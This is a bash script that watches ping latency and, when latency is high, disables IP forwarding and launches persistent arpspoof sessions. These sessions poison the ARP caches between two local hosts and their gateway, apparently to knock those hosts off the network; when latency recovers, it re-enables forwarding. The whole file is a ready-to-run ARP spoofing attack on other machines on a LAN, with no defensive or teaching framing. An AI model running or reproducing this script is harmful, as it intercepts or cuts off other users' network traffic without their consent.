#!/bin/bash

/usr/bin/screen -S 201 -X quit
/usr/bin/screen -S 120 -X quit

ping -q -c2 10.1.1.20 > /dev/null
 
if [ $? -eq 0 ]
then
	ping -c 3 google.com | tail -1| awk '{print $4}' | cut -d '/' -f 2 > /var/ping
	PING=`cat /var/ping`
	PINGMAX=200.0
	if (( $(echo "$PING < $PINGMAX" | bc -l) ));
	then
		echo 1 > /proc/sys/net/ipv4/ip_forward
		#/usr/bin/pkill -15 screen

		/usr/bin/screen -S 2061 -X quit
		/usr/bin/screen -S 1206 -X quit
		echo "Linked"
		echo "Linked" >> /var/state
		date >> /var/state

	else
		echo 0 > /proc/sys/net/ipv4/ip_forward
		/usr/bin/screen -dmS 201 arpspoof -i eth1 -t 10.1.1.20 10.1.1.1
		/usr/bin/screen -dmS 120 arpspoof -i eth1 -t 10.1.1.1 10.1.1.20


		/usr/bin/screen -S 2061 -X quit
		/usr/bin/screen -S 1206 -X quit
		/usr/bin/screen -dmS 2061 arpspoof -i eth1 -t 10.1.1.206 10.1.1.1
		/usr/bin/screen -dmS 1206 arpspoof -i eth1 -t 10.1.1.1 10.1.1.206
		echo "Unlinked"
		echo "Unlinked" >> /var/state
		date >> /var/state
	fi
else
	echo "Offline"
	echo "OFFLINE" >> /var/state
	date >> /var/state
fi